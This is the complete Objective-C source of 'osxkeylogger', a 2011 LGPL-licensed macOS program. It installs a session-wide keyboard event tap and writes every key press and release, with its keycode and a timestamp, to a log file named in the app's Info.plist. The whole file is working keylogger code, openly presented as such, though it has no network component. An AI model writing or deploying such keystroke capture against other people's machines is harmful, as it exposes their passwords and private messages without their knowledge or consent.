//
//  main.m
//  osxkeylogger
//
//  Created by Juha Koivisto on 27.2.2011.
//	Licence: LGPL
//

#import <ApplicationServices/ApplicationServices.h>
#import <mach/mach_time.h>

FILE* openLogFile()
{
	NSBundle*	mainBundle;
	NSString*	logFileNameNS;
	FILE*		pLogFile;
	
	// memory management, construct pool
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	// mainBundle == Info.plist 
	mainBundle = [NSBundle mainBundle];
	
	// read Log file name
	logFileNameNS = [mainBundle objectForInfoDictionaryKey:@"logFile"];
	// to cString
	const char *pLogFileName = [logFileNameNS UTF8String];
	
	pLogFile = fopen(pLogFileName, "a");
	
	// free all memory
	[pool drain];
	
	return pLogFile;
}

CGEventRef recordKeysCallback(CGEventTapProxy	proxy, 
							  CGEventType		type,  
							  CGEventRef		event, 
							  void*				pLogFile) 
{
	// only key up and key down
	// you can do this also with mask
	if (type != kCGEventKeyDown)
	{
		if (type != kCGEventKeyUp) return event;
	}
	
	unsigned long long	currentTime; 
	long long			keycode;
	
	currentTime = mach_absolute_time();
	keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
	
	fprintf((FILE*)pLogFile, 
			"<key><time>%llu</time><type>%u</type><keycode>%llu</keycode></key>\n",
			(unsigned long long)		currentTime,
			(unsigned int)			type,
			(long long)				keycode);
	
	return event; 
}

void createEventListenerLoopSourceAndRun(FILE* pLogFile)
{
	CFMachPortRef		eventTap;  
	CFRunLoopSourceRef	runLoopSource; 
	
	// create event listener
	eventTap = CGEventTapCreate(kCGSessionEventTap, 
								kCGHeadInsertEventTap, 
								0, 
								kCGEventMaskForAllEvents, 
								recordKeysCallback,   // this is the function called
								(void*)pLogFile);
	
	// wrap event listener to loopable form
	runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, 
												  eventTap, 
												  0);
	// add wrapped listener loop
	CFRunLoopAddSource(CFRunLoopGetCurrent(), 
					   runLoopSource, 
					   kCFRunLoopCommonModes);
	
	// enable event tab
	CGEventTapEnable(eventTap, 
					 true);
	
	// run event tab
	CFRunLoopRun();
}

int main (int argc, const char * argv[]) {
	
	FILE* pLogFile;
	pLogFile = openLogFile();
	createEventListenerLoopSourceAndRun(pLogFile);
    return 0;
}